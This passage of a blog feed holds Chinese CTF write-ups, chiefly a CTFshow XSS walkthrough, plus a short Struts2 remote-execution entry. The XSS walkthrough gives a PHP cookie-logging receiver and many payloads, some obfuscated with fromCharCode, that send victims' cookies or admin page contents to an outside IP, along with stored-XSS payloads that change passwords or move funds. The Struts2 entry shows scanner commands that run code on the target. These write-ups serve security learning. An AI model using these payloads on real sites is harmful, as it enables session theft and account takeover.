title="无法写入文件"></a>无法写入文件</h5><p>因为这个php是要把反弹过来的cookie写入txt的，所以我这个虽然可以成功打开，但是一直写入不了，于是更改目录<code>xss</code>的权限为664，改完之后是有写入权限了，但是网页又打不开了，然后发现，作为目录不仅需要写入权限也需要可执行权限，于是改成777，已经全部解决。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> nginx+php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-xss</title>
      <link href="/2024/07/24/web%E5%85%A5%E9%97%A8-xss/"/>
      <url>/2024/07/24/web%E5%85%A5%E9%97%A8-xss/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h4><p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p><p>俗称的见框就插。个人理解，由于HTML的标签特性，可以通过网页的输入框输入脚本代码，使网页执行恶意脚本，达到攻击的目的。</p><h4 id="XSS类型介绍"><a href="#XSS类型介绍" class="headerlink" title="XSS类型介绍"></a>XSS类型介绍</h4><h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a><strong>反射型</strong></h5><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中</p><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p><h5 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h5><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><h5 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h5><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p><p>常见的标签</p><p>1.alert()</p><ul><li>alert(‘xss’)</li><li>alert(“xss”)</li><li>alert(&#x2F;xss&#x2F;)</li><li>alert(document.cookie)</li></ul><p>2.confirm()</p><ul><li>confirm(‘xss’)</li><li>confirm(“xss”)</li><li>confirm(&#x2F;xss&#x2F;)</li><li>confirm(document.cookie)</li></ul><p>3.prompt()</p><ul><li>prompt(‘xss’)</li><li>prompt(“xss”)</li><li>prompt(&#x2F;xss&#x2F;)</li><li>prompt(document.coolkie)</li><li>(&#x2F;xss&#x2F;) 以上三种方法都可以实现，但是会多出两个‘&#x2F;’</li></ul><p>4.document.write()</p><ul><li>document.write(‘</li></ul><h3 id="web316-333"><a href="#web316-333" class="headerlink" title="web316-333"></a>web316-333</h3><h4 id="web316-cookie-script"><a href="#web316-cookie-script" class="headerlink" title="web316(cookie script)"></a>web316(cookie script)</h4><p>可以使用xss平台，也可以使用服务器自己搭建</p><p>在服务器上面放一个接受Cookie的文件。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>cookie.txt里面就可以看到flag，或者查看日志</p><h4 id="web317-img"><a href="#web317-img" class="headerlink" title="web317(img)"></a>web317(img)</h4><p>过滤了<code>script</code>可以使用<code>img</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxx/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie <span class="token operator">></span></code></pre><h4 id="web318-body-iframe"><a href="#web318-body-iframe" class="headerlink" title="web318(body iframe)"></a>web318(body iframe)</h4><p>过滤了<code>img</code>使用<code>body</code>或者<code>iframe</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe οnlοad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><h4 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h4><p>同318</p><h4 id="web320-326-空格绕过-fromCharCode"><a href="#web320-326-空格绕过-fromCharCode" class="headerlink" title="web320-326(空格绕过  fromCharCode)"></a>web320-326(空格绕过  fromCharCode)</h4><p>过滤了<code>script</code>，<code>img</code>，<code>  </code>, <code>iframe</code>。</p><p>web322过滤了xss</p><p>空格可以用<code>%09</code>、<code>tab</code>、<code>/</code>、<code>/**/</code>、<code>%0a</code>代替。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>onload<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://xxxxxxx/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token comment">/**/</span>οnlοad<span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxxxxxx/xss/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">></span></code></pre><p>扩展一下payload：</p><p>String.fromCharCode()函数：ascii码转字符</p><p>参考：<a href="https://www.runoob.com/jsref/jsref-fromcharcode.html">https://www.runoob.com/jsref/jsref-fromcharcode.html</a></p><p>String.fromCharCode(111,110,108,111,97,100); 控制台运行结果如下：</p><p><img src="web%E5%85%A5%E9%97%A8-xss%5Cweb320.png" loading="lazy"></p><p>用它我可以构造一个payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token comment">/**/</span>οnlοad<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xss/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>String2ascii.py</p><pre class="language-python" data-language="python"><code class="language-python">input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入字符串: "</span><span class="token punctuation">)</span>  <span class="token comment"># 获取用户输入的字符串</span>ascii_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span><span class="token keyword">for</span> char <span class="token keyword">in</span> input_str<span class="token punctuation">:</span>    ascii_code <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>  <span class="token comment"># 使用ord()函数获取字符的ASCII码</span>    ascii_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ascii_code<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将ASCII码转换为字符串并添加到列表</span><span class="token comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span>result <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ascii_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"转换后的ASCII码:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span></code></pre><p>Ascii2string.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ascii_to_string</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span>    ascii_list <span class="token operator">=</span> ascii_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> code <span class="token keyword">in</span> ascii_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># 输入以逗号分隔的ASCII码字符串</span>ascii_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入以逗号分隔的ASCII码字符串: "</span><span class="token punctuation">)</span><span class="token comment"># 调用函数进行转换并打印结果</span>string_result <span class="token operator">=</span> ascii_to_string<span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"转换后的字符串:"</span><span class="token punctuation">,</span> string_result<span class="token punctuation">)</span></code></pre><h4 id="web327-存储型xss"><a href="#web327-存储型xss" class="headerlink" title="web327(存储型xss)"></a>web327(存储型xss)</h4><p>虽然但是，还是之前的payload，收件人必须是admin</p><h4 id="web328-伪造Cookie"><a href="#web328-伪造Cookie" class="headerlink" title="web328(伪造Cookie)"></a>web328(伪造Cookie)</h4><p>先提前监听5010端口，然后在注册用户的时候注入payload，反弹管理员的cookie</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>这样得到admin的cookie进行伪造查看用户即可得到flag</p><h4 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h4><p>和上题不同的是，Cookie会立刻失效。不能通过窃取Cookie的形式得到flag了。</p><p>我们分析一下原理，我们的payload作为储存型XSS，管理员访问时候能被我们窃取Cookie，那是不是还能窃取点别的东西呢，比如说管理员看到的用户名和密码。理论上来说是可以的，所以就直接获取管理员的页面信息。</p><p>我们可以通过类名查找元素，通过document来获取。</p><p>现在服务器上面监听端口5010。</p><p>innerHTML和outerHTML的区别</p><blockquote><p>1、innerHTML:<br>　　从对象的起始位置到终止位置的全部内容,不包括Html标签。<br>innerText可替代innerHTML</p><p>2、outerHTML:<br>　　除了包含innerHTML的全部内容外, 还包含对象标签本身。</p></blockquote><p><img src="web329.png" alt="img" loading="lazy"></p><p>可以看到前端代码中将要显示admin密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p><p>payload： </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://117.72.70.186:5010/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'layui-table-cell laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>解释一下它的每一部分：</p><blockquote><p><code>window.open(&#39;http://117.72.70.186:5010/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)</code>这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。<br><code>&#39;http://117.72.70.186:5010/&#39;</code> 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:&#x2F;&#x2F;）、主机名（120.46.41.173）和端口号（9023），以及路径（后面的斜杠 &#x2F;）。<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML</code> 这是一系列 DOM 操作，用于获取网页中特定元素的内容。<br><code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)</code> 是一个通过类名查找元素的方法。它查找具有类名 <code>&#39;layui-table-cell&#39;</code> 和 <code>&#39;laytable-cell-1-0-1&#39;</code> 的元素，通常这是一种针对表格单元格的选择。<br><code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。<br><code>.innerHTML</code> 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。</p></blockquote><p><img src="web329_2.png" loading="lazy"></p><h4 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h4><p>多了一个修改密码，可以看到调用了<code>api/change.php</code>参数p则是我们修改的密码</p><p><img src="web330.png" loading="lazy"></p><p>我们可以伪造admin的cookie来去修改密码，但cookie是暂时的，所以利用xss主动去改</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=111'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>然后登录admin就可以了</p><h4 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h4><p>和上题类似，我们先抓包分析。这次修改密码变成了POST请求。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"api/change.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'p'</span><span class="token operator">:</span><span class="token string">'111'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h4><p>这次多了可以转账的功能</p><p>说是可以向别人转负数，但是我这儿就是有内鬼，停止交易😅</p><p>所以利用xss</p><blockquote><p>jquery的这个ajax不能携带cookie请求，所以有点麻烦，但是如果是本地请求就刚好绕过了这一点</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1/api/amount.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'u'</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string-property property">'a'</span><span class="token operator">:</span><span class="token number">10000</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xs5/post.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>在注册界面填入payload</p><p>然后找个test账号收钱</p><h4 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h4><p>332的方法照样可以</p><p>也可以转账给自己，而且得保证自己最低有1块钱，写个脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> timex<span class="token operator">=</span><span class="token number">5</span>url<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/amount.php"</span>url2<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/getFlag.php"</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID=3o54ih5njfm1hh1ccnet28e59b'</span><span class="token punctuation">&#125;</span>  <span class="token comment">#自己登录后的sessionid</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    t<span class="token operator">=</span>x<span class="token operator">-</span><span class="token number">1</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'u'</span><span class="token punctuation">:</span><span class="token string">'hsad'</span><span class="token punctuation">,</span> <span class="token comment">#注册的用户名</span>    <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">></span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r2<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    x<span class="token operator">+=</span>t</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-Java</title>
      <link href="/2024/07/18/web%E5%85%A5%E9%97%A8-Java/"/>
      <url>/2024/07/18/web%E5%85%A5%E9%97%A8-Java/</url>
      
        <content type="html"><![CDATA[<h3 id="web279-300"><a href="#web279-300" class="headerlink" title="web279-300"></a>web279-300</h3><p><a href="https://www.secrss.com/articles/24780">史上最全Struts 2漏洞复现过程及PoC合集</a></p><h4 id="web279-struts2漏洞-S2-001"><a href="#web279-struts2漏洞-S2-001" class="headerlink" title="web279(struts2漏洞 S2-001)"></a>web279(struts2漏洞 S2-001)</h4><p><a href="https://www.freebuf.com/column/224041.html">Vulhub漏洞系列：struts2漏洞 S2-001</a></p><p>刚开始只学了基础的Java类，Poc中的一些构造方法还未接触，所以刚开始用了<a href="https://github.com/wyzmgmdg/Struts2Scan">Struts2Scan</a>通杀脚本</p><p>检测：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://08c8e9cf-4a7b-458f-b75b-2f2bdeae6c1b.chall.ctf.show:8080/S2-001/login.action</code></pre><p>利用：</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://22350c9d-7de9-4d0c-9e56-b26cd771f1dd.challenge.ctf.show/S2-001/login.action <span class="token parameter variable">-n</span> S2-001 <span class="token parameter variable">--exec</span></code></pre><p>执行命令env即可得到flag</p><p><strong>这集贸太难了，先缓缓</strong></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2023-web</title>
      <link href="/2024/07/14/MoeCTF2023-web/"/>
      <url>/2024/07/14/MoeCTF2023-web/</url>
      
        <content type="html"><![CDATA[<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><pre class="language-php" data-language="php"><code class="language-php">this is <span class="token constant">GET</span> method<span class="token punctuation">,</span>         your mission<span class="token punctuation">:</span>        <span class="token number">1.</span><span class="token keyword">use</span> <span class="token package">parameter</span><span class="token punctuation">:</span> UwU<span class="token operator">=</span>u        <span class="token number">2.</span>post <span class="token operator">**</span>form<span class="token operator">**</span><span class="token punctuation">:</span> Luv<span class="token operator">=</span>u        <span class="token number">3.</span><span class="token keyword">use</span> <span class="token package">admin</span> character        <span class="token number">4.</span>request from <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>        <span class="token number">5.</span><span class="token keyword">use</span> <span class="token package">browser</span> <span class="token string single-quoted-string">'MoeBrowser'</span>        Complete All 